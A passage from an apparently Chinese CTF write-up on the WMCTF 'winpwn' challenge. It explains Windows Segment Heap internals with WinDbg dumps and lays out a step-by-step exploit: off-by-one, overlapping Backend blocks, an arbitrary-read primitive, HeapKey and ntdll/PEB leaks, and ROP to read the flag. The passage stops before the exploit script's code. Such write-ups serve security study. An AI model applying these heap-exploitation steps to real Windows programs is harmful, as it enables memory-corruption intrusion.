class="number">00007F</span>F6A2C7205A                 mov     cs:idx, eax</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00007F</span>F6A2C72060                 jmp     short loc_7FF6A2C7206F</span><br></pre></td></tr></table></figure><p>可以看出来是进行一个赋值操作<code>ptr = tip.glory</code>，这里就可以看出<code>buy</code>功能对<code>ptr</code>指向的位置进行上溢编辑的作用了。</p><p>而<code>Improve combat effectiveness</code>这部分，就是提供一个设置<code>score</code>为负数的机会：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">if</span> ( v2 &amp;&amp; users[a1].score &gt; <span class="number">0</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v2 - <span class="number">1</span>) &lt;= users[a1].score )</span><br><span class="line">&#123;</span><br><span class="line">    users[a1].score -= v2;</span><br><span class="line">    users[a1].hurt += v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在<code>score &gt; 0</code>且<code>v2 = score + 1</code>的情况下，结果是<code>score = -1</code>，而<code>buy</code>功能里<code>if ( users[var18[0]].score &gt; 0x98967Fu &amp;&amp; !used )</code>同样是无符号比较，从而满足了条件。</p></li></ul><h2 id="菜单总结"><a href="#菜单总结" class="headerlink" title="菜单总结"></a>菜单总结</h2><p>这样，整个菜单我们就可以串起来了：</p><ol><li>首先，创建一个<code>user</code>，在编辑<code>user.name</code>的时候，利用off by one设置<code>user.is_vip</code>，解锁<code>case 202108</code>功能，从而实现编辑<code>user.hurt</code>的值，使其满足<code>user.hurt &gt; 0x1000u</code>。</li><li>然后在进入<code>game</code>中，利用<code>attack</code>功能，创建<code>tip3</code>，触发除以0的异常处理逻辑，完成对全局变量<code>ptr</code>的赋值，使<code>ptr = tips[0].glory</code>。</li><li>之后利用<code>improve</code>功能，设置<code>user.score = -1</code>，解锁<code>buy</code>功能，提供一次上溢修改8 bytes的功能。</li><li>最后再结合tip1和tip2实现Segment Heap的利用。</li></ol><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>由于Segment Heap的机制比较复杂，内容较多，而本篇注重于解winpwn这道题，所以只会选择性地挑选重要的部分加以解释补充，如果有不正确的地方还望指正。</p><h2 id="Segment-Heap的空间分配框架"><a href="#Segment-Heap的空间分配框架" class="headerlink" title="Segment Heap的空间分配框架"></a>Segment Heap的空间分配框架</h2><p>首先我们需要了解一下Segment Heap分配空间的整体框架：</p><p><img src="https://p4.ssl.qhimg.com/t01c814e056dde7f150.png" alt="Segment Heap Framework" title="Segment Heap Framework"></p><p>结合这道题目，我们只关注<code>Backend</code>的部分，即<code>size &lt;= 508 KB</code>的逻辑；此外，由于解题过程中并没有涉及到LFH（LowFragmentHeap）的逻辑，这里也不会有所涉及，只会关注于VS（Variable Size Allocation）的部分。</p><h2 id="申请内存空间"><a href="#申请内存空间" class="headerlink" title="申请内存空间"></a>申请内存空间</h2><p>首先在最开始的时候：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">init_buf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *v0; <span class="comment">// rax</span></span><br><span class="line">    FILE *v1; <span class="comment">// rax</span></span><br><span class="line">    FILE *v2; <span class="comment">// rax</span></span><br><span class="line">    HANDLE result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    v0 = _acrt_iob_func(<span class="number">1u</span>);</span><br><span class="line">    setvbuf(v0, <span class="number">0</span>i64, <span class="number">4</span>, <span class="number">0</span>i64);</span><br><span class="line">    v1 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">    setvbuf(v1, <span class="number">0</span>i64, <span class="number">4</span>, <span class="number">0</span>i64);</span><br><span class="line">    v2 = _acrt_iob_func(<span class="number">2u</span>);</span><br><span class="line">    setvbuf(v2, <span class="number">0</span>i64, <span class="number">4</span>, <span class="number">0</span>i64);</span><br><span class="line">    result = HeapCreate(<span class="number">2u</span>, <span class="number">0</span>i64, <span class="number">0</span>i64);</span><br><span class="line">    hHeap = result;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序调用<code>HeapCreate</code>创建了一个私有Heap。</p><p>在这个Heap的开头，存放着管理这整个Heap的结构体<code>_SEGMENT_HEAP</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dt _SEGMENT_HEAP</span><br><span class="line">ntdll!_SEGMENT_HEAP</span><br><span class="line">   +<span class="number">0x000</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> GlobalFlags      : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Interceptor      : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> ProcessHeapListIndex : Uint2B</span><br><span class="line">   +<span class="number">0x01e</span> AllocatedFromMetadata : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x020</span> CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA</span><br><span class="line">   +<span class="number">0x020</span> ReservedMustBeZero1 : Uint8B</span><br><span class="line">   +<span class="number">0x028</span> UserContext      : Ptr64 Void</span><br><span class="line">   +<span class="number">0x030</span> ReservedMustBeZero2 : Uint8B</span><br><span class="line">   +<span class="number">0x038</span> Spare            : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> LargeMetadataLock : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> LargeAllocMetadata : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x058</span> LargeReservedPages : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> LargeCommittedPages : Uint8B</span><br><span class="line">   +<span class="number">0x068</span> StackTraceInitVar : _RTL_RUN_ONCE</span><br><span class="line">   +<span class="number">0x080</span> MemStats         : _HEAP_RUNTIME_MEMORY_STATS</span><br><span class="line">   +<span class="number">0x0d8</span> GlobalLockCount  : Uint2B</span><br><span class="line">   +<span class="number">0x0dc</span> GlobalLockOwner  : Uint4B</span><br><span class="line">   +<span class="number">0x0e0</span> ContextExtendLock : Uint8B</span><br><span class="line">   +<span class="number">0x0e8</span> AllocatedBase    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f0</span> UncommittedBase  : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f8</span> ReservedLimit    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x100</span> SegContexts      : [<span class="number">2</span>] _HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x280</span> VsContext        : _HEAP_VS_CONTEXT</span><br><span class="line">   +<span class="number">0x340</span> LfhContext       : _HEAP_LFH_CONTEXT</span><br><span class="line">       </span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _HEAP_SEG_CONTEXT</span><br><span class="line">ntdll!_HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> SegmentMask      : Uint8B</span><br><span class="line">   +<span class="number">0x008</span> UnitShift        : UChar</span><br><span class="line">   +<span class="number">0x009</span> PagesPerUnitShift : UChar</span><br><span class="line">   +<span class="number">0x00a</span> FirstDescriptorIndex : UChar</span><br><span class="line">   +<span class="number">0x00b</span> CachedCommitSoftShift : UChar</span><br><span class="line">   +<span class="number">0x00c</span> CachedCommitHighShift : UChar</span><br><span class="line">   +<span class="number">0x00d</span> Flags            : &lt;anonymous-tag&gt;</span><br><span class="line">   +<span class="number">0x010</span> MaxAllocationSize : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> OlpStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x016</span> MemStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x018</span> LfhContext       : Ptr64 Void</span><br><span class="line">   +<span class="number">0x020</span> VsContext        : Ptr64 Void</span><br><span class="line">   +<span class="number">0x028</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x038</span> Heap             : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> SegmentLock      : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> SegmentListHead  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x058</span> SegmentCount     : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> FreePageRanges   : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x070</span> FreeSegmentListLock : Uint8B</span><br><span class="line">   +<span class="number">0x078</span> FreeSegmentList  : [<span class="number">2</span>] _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p>（这里的结构体和PDF中的描述的结构体有些不太一样，其中有些成员被放在了<code>+0x100 SegContexts</code>中）。</p><p>其中<code>_SEGMENT_HEAP.SegContexts.SegmentListHead</code>是一个双向链表节点，将所有的Segment都链起来，因为本题只涉及一个Segment，所以这里可以定位到Segment的位置。</p><p><img src="https://p4.ssl.qhimg.com/t0169e950060c15a74f.png" alt="Segment" title="Segment"></p><p>在没有进行任何进一步的内存申请操作时，这个<code>_SEGMENT_HEAP.SegContexts.SegmentListHead</code>指向本身。</p><p>而在我们进入<code>game</code>逻辑，进行了内存分配（比如申请tip3）的时候，首先就会初始化一个Segment结构。</p><p>而对于每个Segment，其内存布局如下：</p><p><img src="https://p0.ssl.qhimg.com/t01eb7f934bf034446a.png" alt="Segment Layout" title="Segment Layout"></p><p>每个Segment开头都是一个<code>_HEAP_PAGE_SEGMENT</code>结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dt _HEAP_PAGE_SEGMENT</span><br><span class="line">ntdll!_HEAP_PAGE_SEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint8B</span><br><span class="line">   +<span class="number">0x018</span> SegmentCommitState : Ptr64 _HEAP_SEGMENT_MGR_COMMIT_STATE</span><br><span class="line">   +<span class="number">0x020</span> UnusedWatermark  : UChar</span><br><span class="line">   +<span class="number">0x000</span> DescArray        : [<span class="number">256</span>] _HEAP_PAGE_RANGE_DESCRIPTOR</span><br></pre></td></tr></table></figure><p>其中这<code>DescArray[2：255]</code>就是管理0x2000偏移开始的254个page的metadata。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _HEAP_PAGE_RANGE_DESCRIPTOR</span><br><span class="line">ntdll!_HEAP_PAGE_RANGE_DESCRIPTOR</span><br><span class="line">   +<span class="number">0x000</span> TreeNode         : _RTL_BALANCED_NODE</span><br><span class="line">   +<span class="number">0x000</span> TreeSignature    : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> UnusedBytes      : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> ExtraPresent     : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x008</span> Spare0           : Pos <span class="number">1</span>, <span class="number">15</span> Bits</span><br><span class="line">   +<span class="number">0x018</span> RangeFlags       : UChar</span><br><span class="line">   +<span class="number">0x019</span> CommittedPageCount : UChar</span><br><span class="line">   +<span class="number">0x01a</span> Spare            : Uint2B</span><br><span class="line">   +<span class="number">0x01c</span> Key              : _HEAP_DESCRIPTOR_KEY</span><br><span class="line">   +<span class="number">0x01c</span> Align            : [<span class="number">3</span>] UChar</span><br><span class="line">   +<span class="number">0x01f</span> UnitOffset       : UChar</span><br><span class="line">   +<span class="number">0x01f</span> UnitSize         : UChar</span><br></pre></td></tr></table></figure><p>之后针对这个<code>Destination = (char *)HeapAlloc(hHeap, 8u, 0x100ui64);</code>，即申请0x100的内存空间的操作，会进行VS SubSegment Allocation，也就是说要初始化一个VS SubSegment。</p><p>于是会触发Backend Allocation，从这个Segment中申请出一个Backend Block作为VS SubSegment使用，在实际调试过程中可以观察到：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dt _HEAP_PAGE_RANGE_DESCRIPTOR <span class="number">0x23958f00000</span>+<span class="number">40</span></span><br><span class="line">ntdll!_HEAP_PAGE_RANGE_DESCRIPTOR</span><br><span class="line">   +<span class="number">0x000</span> TreeNode         : _RTL_BALANCED_NODE</span><br><span class="line">   +<span class="number">0x000</span> TreeSignature    : <span class="number">0xccddccdd</span></span><br><span class="line">   +<span class="number">0x004</span> UnusedBytes      : <span class="number">0x1000</span></span><br><span class="line">   +<span class="number">0x008</span> ExtraPresent     : <span class="number">0</span>y0</span><br><span class="line">   +<span class="number">0x008</span> Spare0           : <span class="number">0</span>y000000000000000 (<span class="number">0</span>)</span><br><span class="line">   +<span class="number">0x018</span> RangeFlags       : <span class="number">0xf</span> <span class="string">''</span></span><br><span class="line">   +0x019 CommittedPageCount : 0x1 ''</span><br><span class="line">   +<span class="number">0x01a</span> Spare            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> Key              : _HEAP_DESCRIPTOR_KEY</span><br><span class="line">   +<span class="number">0x01c</span> Align            : [<span class="number">3</span>]  <span class="string">"???"</span></span><br><span class="line">   +<span class="number">0x01f</span> UnitOffset       : <span class="number">0x11</span> <span class="string">''</span></span><br><span class="line">   +0x01f UnitSize         : 0x11 ''</span><br></pre></td></tr></table></figure><ul><li><code>DescArray[2].UnitSize = 0x11</code>表明该Backend Block由11个page构成（大小为0x11000），其中前10个page作为VS SubSegment的空间（0x10000），剩下的1个page是guard page，用来防止堆溢出影响到该VS SubSegment后面的内容：</li></ul><p><img src="https://p1.ssl.qhimg.com/t0172377e01a1568bba.png" alt="Guard Page" title="Guard Page"></p><ul><li><code>DescArray[2].Rangeflags = 0xf</code>是标志位，各个bit表示：<ul><li>0x01：表示Allocated。</li><li>0x02：表示该<code>DescArray</code>是连续的descriptors的首个。</li><li>0x08：表示该Backend block用于LFH subsegment。</li><li>0x0C：表示该Backend block用于VS subsegment。</li></ul></li></ul><p>这样，在偏移0x2000 ~ 0x12000的这部分内存就是VS subsegment（不包括guard page），它开头的位置是一个<code>_HEAP_VS_SUBSEGMENT</code>的管理结构体，紧接着后面就是VS block，将分配给用户使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dt _HEAP_VS_SUBSEGMENT</span><br><span class="line">ntdll!_HEAP_VS_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> CommitBitmap     : Uint8B</span><br><span class="line">   +<span class="number">0x018</span> CommitLock       : Uint8B</span><br><span class="line">   +<span class="number">0x020</span> Size             : Uint2B</span><br><span class="line">   +<span class="number">0x022</span> Signature        : Pos <span class="number">0</span>, <span class="number">15</span> Bits</span><br><span class="line">   +<span class="number">0x022</span> FullCommit       : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t012839333d230be562.png" alt="VS Subsegment" title="VS Subsegment"></p><p>需要注意的是，每个VS Block的前0x20个字节是头部的metadata，从0x20开始才是分配给用户使用的区域，所以第一申请得到的内存地址为<code>Segment + 0x2000 + 0x30 + 0x20</code>的位置。</p><p>接下来，如果继续调用<code>attack</code>然后申请<code>tip2</code>，触发<code>HeapAlloc(hHeap, 8u, 0x20000ui64)</code>，即申请0x20000的内存时，由于实际会申请<code>0x20000 + 0x10</code>（加个header）的空间，它将不会触发VS Allocation的分配机制而时使用Backend Allocation进行分配，拿出连续的page当作内存空间返回给用户使用。</p><p>具体地，就是从剩下的<code>DescArray[0x13:0xFF]</code>的整块空间中，切割出<code>DescArray[0x13:0x33]</code>管理的这0x21个page（偏移0x13000 ~ 0x34000）出来使用。</p><h2 id="Backend-Allocation对空闲内存的管理"><a href="#Backend-Allocation对空闲内存的管理" class="headerlink" title="Backend Allocation对空闲内存的管理"></a>Backend Allocation对空闲内存的管理</h2><p>这题的关键就在于，在Backend Allocation中，有一个关键的字段，即<code>_HEAP_PAGE_RANGE_DESCRIPTOR.UnitSize</code>，（这里的<code>_HEAP_PAGE_RANGE_DESCRIPTOR</code>指的是首个）。</p><p>它表示当前的Backend block有多少的空闲的page，即表明了有多少空闲的空间可以被分配出去。</p><p>存在多个Freed的Backend block的情况下，它们则用红黑树进行组织，但这里不对细节进行描述，只需要知道在正常情况下，Backend Allocation采用Best-Fit的方式，即找到满足大小的最小Backend block进行切割（如果有必要切割）分配。</p><h2 id="可行的利用方式"><a href="#可行的利用方式" class="headerlink" title="可行的利用方式"></a>可行的利用方式</h2><p>结合以上简单的了解，围绕这道题，我们可以设计出一个可能的利用场景——伪造<code>_HEAP_PAGE_RANGE_DESCRIPTOR.UnitSize</code>造成Backend block的overlap。</p><p>此外由于VS Subsegment也来自于Backend block，这样可以通过Backend block overlap达到对VS Subsegment整个结构的完全控制，或者更简单点，就能达到对VS block的二次分配：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">                       +---------------+</span><br><span class="line">                       |    .......    |</span><br><span class="line">                       +---------------+</span><br><span class="line">                    +--|   Page 0x02   |-------------------------+</span><br><span class="line">                    |  +---------------+                         |</span><br><span class="line">Backend block 0  &lt;--+  |    .......    |                         |</span><br><span class="line">                    |  +---------------+                         |</span><br><span class="line">                    +--|   Page 0x22   |                         |</span><br><span class="line">                       +---------------+                         +--&gt; Fake Backend block 0 </span><br><span class="line">                    +--|   Page 0x23   |--+                      |    (overlap Backend block 1)</span><br><span class="line">                    |  +---------------+  |                      |</span><br><span class="line">Backend block 1  &lt;--+  |    .......    |  +--&gt;  VS Subsegment    |</span><br><span class="line">                    |  +---------------+  |                      |</span><br><span class="line">                    +--|   Page 0x34   |--+----------------------+</span><br><span class="line">                       +---------------+</span><br><span class="line">                       |    .......    |</span><br><span class="line">                       +---------------+</span><br></pre></td></tr></table></figure><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ol><li><p>首先完成“菜单总结”部分的步骤，此时Segment Heap的各种结构已经完成初始化。</p></li><li><p>利用tip1（tips[1]）的任意大小内存空间分配，分配0xfe90大小的空间，将VS block用尽。</p></li><li><p>再次利用tip1（tips[2]），分配0x20000大小的空间，触发Backend Allocation（记为Backend block 1）。</p></li><li><p>利用tip2（tips[3]），此时首先会分配0x20的空间，由于之前分配的VS block已经用尽，从而这次申请内存（&lt; 0x20000）时，触发Backend Allocation（记为Backend block 2，与Backend block 1连续）分配内存给VS Subsegment。</p><p>于是这个0x20的内存空间将落在Backend block 2中，Backend block 1之后。</p><p>之后再分配0x20000的空间，该地址会存放在上面提到的0x20的结构体中。</p></li><li><p>释放Backend block 1，并利用<code>buy</code>功能，修改<code>DescArray[0x13].UnitSize</code>，构造Backend block overlap，使得原Backend block 1 overlap Backend block 2。</p></li><li><p>利用tip1（tips[5]），分配0x20000大小的空间，切割Backend block 1，剩下的部分正好和Backend block 2重合。</p></li><li><p>利用tip2（tips[6]），VS Allocation正常分配第一个0x20的内存空间，而可编辑的0x20000的内存空间将通过Backend Allocation拿到Backend block 2的地址。</p></li><li><p>于是由于<code>tips[6].glory-&gt;buf</code>指向的地址空间正好位于VS Subsegment处，且<code>tips[3].glory</code>和<code>tips[6].glory</code>结构体也落在VS block的地方，那么通过编辑<code>tips[6].glory-&gt;buf</code>然后<code>show</code>就能打印出上面的Heap地址（由于<code>HeapAlloc</code>传入的<code>dwFlags = 8</code>，申请出来的内存内容会清空，但是由于<code>tips[6].glory</code>是申请完再写入的，会被保留）；再根据这个Heap地址即可计算出该Segment的基址。</p></li><li><p>同时，通过编辑<code>tips[6].glory-&gt;buf</code>指向的内存空间，就可以完全控制<code>tips[3].glory</code>结构体，包括其中的<code>tips[3].glory-&gt;buf</code>指针；但是由于<code>tips[3].glory-&gt;encoding = 0x1a1a2b2b3c3c4d4d</code>，而<code>\x1a</code>字符在Windows的字符流输入模式下相当于EOF，因此无法读入，故在对<code>tips[3].glory-&gt;buf</code>进行<code>edit</code>的时候只能一次只能写0x10 bytes，不过影响不大。</p></li><li><p>这样，我们就能通过<code>tips[3]</code>和<code>tips[6]</code>构造出任意地址读的原语。</p></li><li><p>通过任意地址读，读取任意一个VS block的header，该header的前8 bytes是encode过的，具体通过：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header = header ^ HeapKey ^ block_addr</span><br></pre></td></tr></table></figure><p>计算得出，同样的通过encode过的header，由于原header和block_addr都是已知的，可以反推出HeapKey的值（可以在调试过程中，读取<code>ntdll!RtlpHpHeapGlobals</code>结构体中的<code>HeapKey</code>进行验证，这是一个<code>_RTLP_HP_HEAP_GLOBALS</code>结构体）。</p></li><li><p>之后通过前面leak出来的Segment的地址，读出<code>_HEAP_PAGE_SEGMENT.ListEntry.Flink</code>（指向<code>_SEGMENT_HEAP.SegContexts.SegmentListHeap</code>），从而计算出这个私有Segment Heap的首地址。</p></li><li><p>再leak出<code>_SEGMENT_HEAP.SegContexts.Callbacks.Allocate</code>指针，其值为encode过的<code>ntdll!RtlpHpVsContextAllocate</code>值，其算法为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SEGMENT_HEAP.SegContexts.Callbacks.Allocate = ntdll!RtlpHpVsContextAllocate ^ HeapKey ^ &amp;_SEGMENT_HEAP.SegContexts</span><br></pre></td></tr></table></figure><p>由于HeapKey已经计算出来了，所以只要根据encode的值推算出<code>ntdll!RtlpHpVsContextAllocate</code>的值即可，从而计算出ntdll的基地址。</p></li><li><p>之后就是常规套路了，通过<code>ntdll!PebLdr - 0x78</code>处的PEB相关地址，leak出PEB的地址，并且由于PEB和TEB的地址偏移固定，故可以leak出TEB的地址；此外还能读取PEB上存放的program base值，再通过程序IAT表中的导入函数，得到各个有需要的dll的基址即可；此外读取TEB中的Stack Base准备爆破<code>game</code>函数函数栈位置。</p></li><li><p>最后在<code>game</code>的返回地址处写ROP进行ORW（这里尝试直接执行<code>system(&quot;cmd.exe&quot;)</code>无法getshell，原因不明），且需要注意的是，与Linux下的用户态程序相比，Windows的栈行为有些不同：</p></li></ol><p><img src="https://p0.ssl.qhimg.com/t014166c6e2f8d13c81.png" alt="Windows call stack" title="Windows call stack"></p><pre><code>从这张图中可以看出，作为调用者的Function A，其还会保留0x20 bytes的空间，供被调用的Function B存放四个参数寄存器RCX RDX R8 R9；也就是说，我们不能像在Linux下一样布置ROP，而要考虑到这部分`register parameter stack area`的空间会被破坏。</code></pre><ol start="16"><li>然后退出game，触发ROP读flag即可。</li></ol><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>由于我个人也没有完全搞清楚整个Segment Heap的机制，仅是在针对WMCTF winpwn这道题的情况下进行了部分的分析，整个过程也学习到了很多，但仍有许多细节没有弄清楚。原PDF分析得十分清楚，还需要深入地学习。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span 